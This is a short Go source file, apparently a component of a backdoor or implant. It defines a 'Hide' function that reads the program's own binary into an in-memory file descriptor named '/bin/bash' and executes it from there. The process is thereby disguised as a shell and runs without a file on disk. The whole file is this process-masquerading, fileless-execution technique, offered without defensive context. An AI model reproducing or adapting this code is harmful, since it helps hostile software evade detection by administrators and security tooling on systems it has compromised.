package Hide

import (
	"main/HandlePacket"
	"main/util"
	"os"
)

func Hide() {
	for i, arg := range os.Args {
		if arg == "-hide" {
			os.Args = append(os.Args[:i], os.Args[i+1:]...)
		}
	}
	name := "/bin/bash"
	memfd := HandlePacket.New(name)
	memfd.Write(util.ReadMySelf())
	memfd.Execute(os.Args[1:])
}
